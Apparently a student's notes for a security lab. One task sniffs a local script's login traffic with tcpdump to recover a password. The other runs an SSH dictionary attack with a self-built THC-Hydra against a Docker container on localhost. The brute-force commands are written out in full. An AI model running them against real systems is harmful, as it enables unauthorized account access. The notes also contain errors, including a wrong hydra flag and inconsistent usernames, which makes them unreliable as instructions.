# Tasks
- Task 0
run the script ./user_authenticating_into_server in your local ubuntu or any linux machine, then use tcpdump to sniff the network to find the password.

- Task 1.
Dictionary attack
* Install docker on your ubuntu or vagrant. (digital ocean)
* download container. **docker run -p 2222:22 -d ti sylvainkalache/264-1**
* sudo docker ps
* ssh sylvian@127.0.0.1 -p 2222 -- used to run the docker container/image.
* install hydra (digital ocean steps)
* get a file containing possible passwords (https://thehacktoday.com/password-cracking-dictionarys-download-for-free/)
* ERROR: compiled ithout LIBSSH v0.4.s support, module is not available.
	* sudo apt-get install libssh-dev
	* cd thc-hydra/
	* sudo make clean -- clean the last make done for hydra
	* sudo ./configure
	* sudo make install
* hydra -s 2222 -l sylvain -p password-text-file.txt 127.0.0.1 -v ssh
using brute force to get the password, you have to wait several hours.
